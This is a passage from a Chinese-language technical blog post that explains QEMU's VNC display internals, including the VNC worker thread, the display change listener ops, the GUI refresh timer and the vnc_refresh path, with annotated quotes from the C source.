class="hljs-number">32</span>;<br><br>    qemu_mutex_init(&amp;vd-&gt;mutex);<br>    vnc_start_worker_thread();  <span class="hljs-comment">// 启动 VNC 的 worker 线程</span><br><br>    vd-&gt;dcl.ops = &amp;dcl_ops; <span class="hljs-comment">// 设置 DisplayChangeListener 的 ops</span><br>    register_displaychangelistener(&amp;vd-&gt;dcl);<br>    vd-&gt;kbd = qkbd_state_init(vd-&gt;dcl.con);<br>&#125;<br></code></pre></td></tr></table></figure><p>大致流程如下：</p><ul><li>创建一个 VncDisplay，加入到全局链表中</li><li>初始化键盘布局</li><li>启动 VNC worker thread（若未启动），由 worker thread 将图像信息发送给 client</li><li>设置该 VncDisplay 对应的 DisplayChangeListener 的 ops 为 <code>dcl_ops</code></li><li>调用 <code>register_displaychangelistener()</code> 注册该 VncDisplay 对应的 DisplayChangeListener</li></ul><h3 id="I、VNC-worker-thread-将图像更新发送给客户端"><a href="#I、VNC-worker-thread-将图像更新发送给客户端" class="headerlink" title="I、VNC worker thread - 将图像更新发送给客户端"></a>I、VNC worker thread - 将图像更新发送给客户端</h3><p><code>vnc worker thread</code> 是 Qemu 中 VNC 服务中的一个重要的线程，其用以持续地处理挂载在全局的 VncJobQueue 上的 VncJob，并将图像更新数据发送给 vnc 客户端</p><p>在 <code>vnc_display_init()</code> 中创建 VncDisplay 实例时，其还会调用 <code>vnc_start_worker_thread()</code> 启动 vnc worker thread：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">vnc_worker_thread_running</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">queue</span>; <span class="hljs-comment">/* Check global queue */</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vnc_start_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    VncJobQueue *q;<br><br>    <span class="hljs-keyword">if</span> (vnc_worker_thread_running())<br>        <span class="hljs-keyword">return</span> ;<br><br>    q = vnc_queue_init();<br>    qemu_thread_create(&amp;q-&gt;thread, <span class="hljs-string">&quot;vnc_worker&quot;</span>, vnc_worker_thread, q,<br>                       QEMU_THREAD_DETACHED);<br>    <span class="hljs-built_in">queue</span> = q; <span class="hljs-comment">/* Set global queue */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该线程的本体便是 <code>vnc_worker_thread</code> 函数，主要就是一个重复调用 <code>vnc_worker_thread_loop</code> 的大循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">vnc_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    VncJobQueue *<span class="hljs-built_in">queue</span> = arg;<br><br>    qemu_thread_get_self(&amp;<span class="hljs-built_in">queue</span>-&gt;thread);<br><br>    <span class="hljs-keyword">while</span> (!vnc_worker_thread_loop(<span class="hljs-built_in">queue</span>)) ;<br>    vnc_queue_clear(<span class="hljs-built_in">queue</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>vnc_worker_thread_loop</code> 定义如下，该函数会一直等待到全局的 VncJobQueue 的 VncJob 链表非空，单次调用处理一个 VncJob：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vnc_worker_thread_loop</span><span class="hljs-params">(VncJobQueue *<span class="hljs-built_in">queue</span>)</span><br>&#123;<br>    VncJob *job;<br>    VncRectEntry *entry, *tmp;<br>    VncState vs = &#123;&#125;;<br>    <span class="hljs-type">int</span> n_rectangles;<br>    <span class="hljs-type">int</span> saved_offset;<br><br>    vnc_lock_queue(<span class="hljs-built_in">queue</span>);  <span class="hljs-comment">// 等待全局 queue 不为空</span><br>    <span class="hljs-keyword">while</span> (QTAILQ_EMPTY(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs) &amp;&amp; !<span class="hljs-built_in">queue</span>-&gt;<span class="hljs-built_in">exit</span>) &#123;<br>        qemu_cond_wait(&amp;<span class="hljs-built_in">queue</span>-&gt;cond, &amp;<span class="hljs-built_in">queue</span>-&gt;mutex);<br>    &#125;<br>    <span class="hljs-comment">/* Here job can only be NULL if queue-&gt;exit is true */</span><br>    job = QTAILQ_FIRST(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs);  <span class="hljs-comment">// 取下第一个 job</span><br>    vnc_unlock_queue(<span class="hljs-built_in">queue</span>);<br>    assert(job-&gt;vs-&gt;magic == VNC_MAGIC);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span>-&gt;<span class="hljs-built_in">exit</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    vnc_lock_output(job-&gt;vs);  <span class="hljs-comment">// 锁上 VncState</span><br>    <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="hljs-literal">NULL</span> || job-&gt;vs-&gt;<span class="hljs-built_in">abort</span> == <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// io channel 为空或 abort 为真，断开连接</span><br>        vnc_unlock_output(job-&gt;vs);<br>        <span class="hljs-keyword">goto</span> disconnected;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (buffer_empty(&amp;job-&gt;vs-&gt;output)) &#123;<br>        <span class="hljs-comment">// 这里的 output 为 Buffer 类型，类似于 iovec，包含着长度与一个指向 buffer 的指针</span><br>        <span class="hljs-comment">// buffer_move_empty(*to, *from) 的作用就是释放 to 的 buffer，将 from 的 buffer 给到 to 的 buffer</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Looks like a NOP as it obviously moves no data.  But it</span><br><span class="hljs-comment">         * moves the empty buffer, so we don&#x27;t have to malloc a new</span><br><span class="hljs-comment">         * one for vs.output</span><br><span class="hljs-comment">         */</span><br>        buffer_move_empty(&amp;vs.output, &amp;job-&gt;vs-&gt;output);<br>    &#125;<br>    vnc_unlock_output(job-&gt;vs);<br><br>    <span class="hljs-comment">/* Make a local copy of vs and switch output buffers */</span><br>    vnc_async_encoding_start(job-&gt;vs, &amp;vs);<br>    vs.magic = VNC_MAGIC;<br><br>    <span class="hljs-comment">/* Start sending rectangles */</span><br>    n_rectangles = <span class="hljs-number">0</span>;<br>    vnc_write_u8(&amp;vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);<br>    vnc_write_u8(&amp;vs, <span class="hljs-number">0</span>);<br>    saved_offset = vs.output.offset;<br>    vnc_write_u16(&amp;vs, <span class="hljs-number">0</span>);<br><br>    vnc_lock_display(job-&gt;vs-&gt;vd);<br>    <span class="hljs-comment">// 遍历该 job 上的 VncRect，发送给 client</span><br>    QLIST_FOREACH_SAFE(entry, &amp;job-&gt;rectangles, next, tmp) &#123;<br>        <span class="hljs-type">int</span> n;<br><br>        <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// io channel 为空，断开连接</span><br>            vnc_unlock_display(job-&gt;vs-&gt;vd);<br>            <span class="hljs-comment">/* Copy persistent encoding data */</span><br>            vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br>            <span class="hljs-keyword">goto</span> disconnected;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (vnc_worker_clamp_rect(&amp;vs, job, &amp;entry-&gt;rect)) &#123;<br>            <span class="hljs-comment">// 发送 buffer</span><br>            n = vnc_send_framebuffer_update(&amp;vs, entry-&gt;rect.x, entry-&gt;rect.y,<br>                                            entry-&gt;rect.w, entry-&gt;rect.h);<br><br>            <span class="hljs-keyword">if</span> (n &gt;= <span class="hljs-number">0</span>) &#123;<br>                n_rectangles += n;<br>            &#125;<br>        &#125;<br>        g_free(entry);<br>    &#125;<br>    trace_vnc_job_nrects(&amp;vs, job, n_rectangles);<br>    vnc_unlock_display(job-&gt;vs-&gt;vd);<br><br>    <span class="hljs-comment">/* Put n_rectangles at the beginning of the message */</span><br>    vs.output.buffer[saved_offset] = (n_rectangles &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    vs.output.buffer[saved_offset + <span class="hljs-number">1</span>] = n_rectangles &amp; <span class="hljs-number">0xFF</span>;<br><br>    vnc_lock_output(job-&gt;vs);<br>    <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc != <span class="hljs-literal">NULL</span>) &#123;<br>        buffer_move(&amp;job-&gt;vs-&gt;jobs_buffer, &amp;vs.output);<br>        <span class="hljs-comment">/* Copy persistent encoding data */</span><br>        vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br><br>        qemu_bh_schedule(job-&gt;vs-&gt;bh);<br>    &#125;  <span class="hljs-keyword">else</span> &#123;<br>        buffer_reset(&amp;vs.output);<br>        <span class="hljs-comment">/* Copy persistent encoding data */</span><br>        vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br>    &#125;<br>    vnc_unlock_output(job-&gt;vs);<br><br>disconnected:<br>    vnc_lock_queue(<span class="hljs-built_in">queue</span>);<br>    QTAILQ_REMOVE(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs, job, next);<br>    vnc_unlock_queue(<span class="hljs-built_in">queue</span>);<br>    qemu_cond_broadcast(&amp;<span class="hljs-built_in">queue</span>-&gt;cond);<br>    g_free(job);<br>    vs.magic = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数的流程如下：</p><ul><li>检查全局 queue 的 job 链表是否为空，若是则进入睡眠等待</li><li>锁上第一个 job，检查对应 VncState 的 IO channel 是否为空，若是则跳到结束发送</li><li>若 VncState 的 output buffer （Buffer 类型，类似于 iovec，有长度和指向实际 buffer 的指针）的 offset 为 0，则将其给到函数内临时创建的 VncState 的 output buffer，原 buffer 设为 NULL</li><li>遍历该 job 上的 VncRect，发送给 client，若 io channel 为空，则跳到结束发送</li><li>若 VncState 的 io channel 不为空，则将函数内临时创建的 VncState 的 output buffer 给回原 VncState</li><li>（结束发送）从全局 queue 上取下该 job 并释放</li></ul><h3 id="II、VNC-的-dcl-ops"><a href="#II、VNC-的-dcl-ops" class="headerlink" title="II、VNC 的 dcl_ops"></a>II、VNC 的 dcl_ops</h3><p>在 <code>vnc_display_init()</code> 中创建 VncDisplay 实例时会将其 DisplayChangeListener 的函数表初始化为 <code>dcl_ops</code> 函数表，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> DisplayChangeListenerOps dcl_ops = &#123;<br>    .dpy_name             = <span class="hljs-string">&quot;vnc&quot;</span>,<br>    .dpy_refresh          = vnc_refresh,<br>    .dpy_gfx_update       = vnc_dpy_update,<br>    .dpy_gfx_switch       = vnc_dpy_switch,<br>    .dpy_gfx_check_format = qemu_pixman_check_format,<br>    .dpy_mouse_set        = vnc_mouse_set,<br>    .dpy_cursor_define    = vnc_dpy_cursor_define,<br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看到的是其中主要都是与 vnc 相关的操作函数，后面涉及到具体函数时我们再展开分析</p><h3 id="III、register-displaychangelistener-注册-dcl，启动-timer"><a href="#III、register-displaychangelistener-注册-dcl，启动-timer" class="headerlink" title="III、register_displaychangelistener - 注册 dcl，启动 timer"></a>III、register_displaychangelistener - 注册 dcl，启动 timer</h3><p>该函数定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">register_displaychangelistener</span><span class="hljs-params">(DisplayChangeListener *dcl)</span><br>&#123;<br>    QemuConsole *con;<br><br>    assert(!dcl-&gt;ds);<br><br>    trace_displaychangelistener_register(dcl, dcl-&gt;ops-&gt;dpy_name);<br>    dcl-&gt;ds = get_alloc_displaystate();<br>    QLIST_INSERT_HEAD(&amp;dcl-&gt;ds-&gt;listeners, dcl, next);<br>    gui_setup_refresh(dcl-&gt;ds);<br>    <span class="hljs-keyword">if</span> (dcl-&gt;con) &#123;<br>        dcl-&gt;con-&gt;dcls++;<br>        con = dcl-&gt;con;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        con = active_console;<br>    &#125;<br>    displaychangelistener_display_console(dcl, con, dcl-&gt;con ? &amp;error_fatal : <span class="hljs-literal">NULL</span>);<br>    text_console_update_cursor(<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要做了这些事情：</p><ul><li>将 dcl 插到对应 DisplayState 的 listeners 链表上</li><li>调用 <code>gui_setup_refresh()</code> 启动一个 Qemu Timer</li><li>调用 <code>displaychangelistener_display_console()</code> 进行相关初始化操作，其中会调用 <code>dcl-&gt;ops</code> 中函数</li></ul><p>我们主要关注 <code>gui_setup_refresh()</code>，其会启动一个 Qemu 定时器，定期地刷新 frame buffer，这也是更新显卡数据的核心：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">gui_setup_refresh</span><span class="hljs-params">(DisplayState *ds)</span><br>&#123;<br>    DisplayChangeListener *dcl;<br>    <span class="hljs-type">bool</span> need_timer = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">bool</span> have_gfx = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">bool</span> have_text = <span class="hljs-literal">false</span>;<br><br>    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh != <span class="hljs-literal">NULL</span>) &#123;<br>            need_timer = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update != <span class="hljs-literal">NULL</span>) &#123;<br>            have_gfx = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_text_update != <span class="hljs-literal">NULL</span>) &#123;<br>            have_text = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (need_timer &amp;&amp; ds-&gt;gui_timer == <span class="hljs-literal">NULL</span>) &#123;<br>        ds-&gt;gui_timer = timer_new_ms(QEMU_CLOCK_REALTIME, gui_update, ds);<br>        timer_mod(ds-&gt;gui_timer, qemu_clock_get_ms(QEMU_CLOCK_REALTIME));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!need_timer &amp;&amp; ds-&gt;gui_timer != <span class="hljs-literal">NULL</span>) &#123;<br>        timer_free(ds-&gt;gui_timer);<br>        ds-&gt;gui_timer = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    ds-&gt;have_gfx = have_gfx;<br>    ds-&gt;have_text = have_text;<br>&#125;<br></code></pre></td></tr></table></figure><p>当 dcl-&gt;ops 的 <code>dpy_refresh</code> 指针非空<strong>且当前 DisplayState 未设置 timer 时</strong>，便会调用 <code>timer_new_ms()</code> 新建一个毫秒级别的定时器，定时调用 <code>gui_update()</code> 刷新显存，接收的参数便为该 DisplayState</p><h1 id="0x03-显示设备更新相关函数"><a href="#0x03-显示设备更新相关函数" class="headerlink" title="0x03.显示设备更新相关函数"></a>0x03.显示设备更新相关函数</h1><p>前面我们讲到，在 Qemu 启动时会启动一个 Timer 定时进行显存的刷新，其代码调用关系如下图所示：</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p><h2 id="一、gui-update-timer-定时调用进行更新操作"><a href="#一、gui-update-timer-定时调用进行更新操作" class="headerlink" title="一、gui_update - timer 定时调用进行更新操作"></a>一、gui_update - timer 定时调用进行更新操作</h2><p>我们先来看 <code>gui_update()</code> 这个由 timer 定时调用的函数，其定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">gui_update</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> interval = GUI_REFRESH_INTERVAL_IDLE;<br>    <span class="hljs-type">uint64_t</span> dcl_interval;<br>    DisplayState *ds = opaque;<br>    DisplayChangeListener *dcl;<br>    QemuConsole *con;<br><br>    ds-&gt;refreshing = <span class="hljs-literal">true</span>;<br>    dpy_refresh(ds);<br>    ds-&gt;refreshing = <span class="hljs-literal">false</span>;<br><br>    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;<br>        dcl_interval = dcl-&gt;update_interval ?<br>            dcl-&gt;update_interval : GUI_REFRESH_INTERVAL_DEFAULT;<br>        <span class="hljs-keyword">if</span> (interval &gt; dcl_interval) &#123;<br>            interval = dcl_interval;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ds-&gt;update_interval != interval) &#123;<br>        ds-&gt;update_interval = interval;<br>        QTAILQ_FOREACH(con, &amp;consoles, next) &#123;<br>            <span class="hljs-keyword">if</span> (con-&gt;hw_ops-&gt;update_interval) &#123;<br>                con-&gt;hw_ops-&gt;update_interval(con-&gt;hw, interval);<br>            &#125;<br>        &#125;<br>        trace_console_refresh(interval);<br>    &#125;<br>    ds-&gt;last_update = qemu_clock_get_ms(QEMU_CLOCK_REALTIME);<br>    timer_mod(ds-&gt;gui_timer, ds-&gt;last_update + interval);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要流程如下：</p><ul><li>调用 <code>dpy_refresh()</code> ，该函数会遍历 DisplayState 中的所有 DisplayChangeListener 并调用 <code>dcl-&gt;ops-&gt;dpy_refresh()</code></li><li>遍历 DisplayState 中的所有 DisplayChangeListener，检查 <code>dcl-&gt;update_interval</code></li><li>若 <code>ds-&gt;update_interval != interval</code>，遍历所有的 QemuConsole 并调用 <code>con-&gt;hw_ops-&gt;update_interval()</code> 进行硬件数据更新</li></ul><h2 id="二、dpy-refresh-遍历-dcl-并调用-dcl-gt-ops-gt-dpy-refresh-进行更新"><a href="#二、dpy-refresh-遍历-dcl-并调用-dcl-gt-ops-gt-dpy-refresh-进行更新" class="headerlink" title="二、dpy_refresh - 遍历 dcl 并调用 dcl-&gt;ops-&gt;dpy_refresh 进行更新"></a>二、dpy_refresh - 遍历 dcl 并调用 dcl-&gt;ops-&gt;dpy_refresh 进行更新</h2><p><code>dpy_refresh()</code> 比较简单，主要就是遍历 DisplayState 中的所有 DisplayChangeListener 并调用 <code>dcl-&gt;ops-&gt;dpy_refresh()</code>，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">dpy_refresh</span><span class="hljs-params">(DisplayState *s)</span><br>&#123;<br>    DisplayChangeListener *dcl;<br><br>    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh) &#123;<br>            dcl-&gt;ops-&gt;dpy_refresh(dcl);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们主要关注与 VNC 有关的部分，对于 VNC 而言，其 <code>dcl-&gt;ops-&gt;dpy_refresh</code> 应为 <code>vnc_refresh</code>，该函数定义于 <code>ui/vnc.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vnc_refresh</span><span class="hljs-params">(DisplayChangeListener *dcl)</span><br>&#123;<br>    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);<br>    VncState *vs, *vn;<br>    <span class="hljs-type">int</span> has_dirty, rects = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (QTAILQ_EMPTY(&amp;vd-&gt;clients)) &#123;   <span class="hljs-comment">// 没有 client，直接返回</span><br>        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_MAX);   <span class="hljs-comment">//更新计时</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    graphic_hw_update(vd-&gt;dcl.con); <span class="hljs-comment">// 硬件更新</span><br><br>    <span class="hljs-keyword">if</span> (vnc_trylock_display(vd)) &#123;<br>        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_BASE);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    has_dirty = vnc_refresh_server_surface(vd); <span class="hljs-comment">// 检查是否有待更新数据</span><br>    vnc_unlock_display(vd);<br><br>    QTAILQ_FOREACH_SAFE(vs, &amp;vd-&gt;clients, next, vn) &#123;<br>        rects += vnc_update_client(vs, has_dirty);  <span class="hljs-comment">// 遍历更新 client</span><br>        <span class="hljs-comment">/* vs might be free()ed here */</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (has_dirty &amp;&amp; rects) &#123;<br>        vd-&gt;dcl.update_interval /= <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (vd-&gt;dcl.update_interval &lt; VNC_REFRESH_INTERVAL_BASE) &#123;<br>            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_BASE;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        vd-&gt;dcl.update_interval += VNC_REFRESH_INTERVAL_INC;<br>        <span class="hljs-keyword">if</span> (vd-&gt;dcl.update_interval &gt; VNC_REFRESH_INTERVAL_MAX) &#123;<br>            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_MAX;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数主要流程如下：</p><ul><li>检查是否有连接的客户端，若否则更新计时后直接返回</li><li>调用 <code>graphic_hw_update()</code> 更新 dcl 对应的 QemuConsole 对应的硬件设备</li><li>调用 <code>vnc_refresh_server_surface()</code> 检查是否有 dirty 区域（待更新区域）</li><li>遍历 dcl 上的 client， 调用 <code>vnc_update_client()</code> 创建新的 VncJob 挂载到全局链表上，由 worker thread 进行推送</li></ul><h2 id="三、graphic-hw-update-图形硬件数据更新"><a href="#三、graphic-hw-update-图形硬件数据更新" class="headerlink" title="三、graphic_hw_update - 图形硬件数据更新"></a>三、graphic_hw_update - 图形硬件数据更新</h2><p>前面我们涉及到的都是 console、vnc 这一块的数据更新，并没有触及到实际的硬件方面（qemu 模拟显卡等）的更新，这一块实际的更新是由 <code>graphic_hw_update()</code> 来完成的，该函数定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">graphic_hw_update</span><span class="hljs-params">(QemuConsole *con)</span><br>&#123;<br>    <span class="hljs-type">bool</span> async = <span class="hljs-literal">false</span>;<br>    con = con ? con : active_console;<br>    <span class="hljs-keyword">if</span> (!con) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    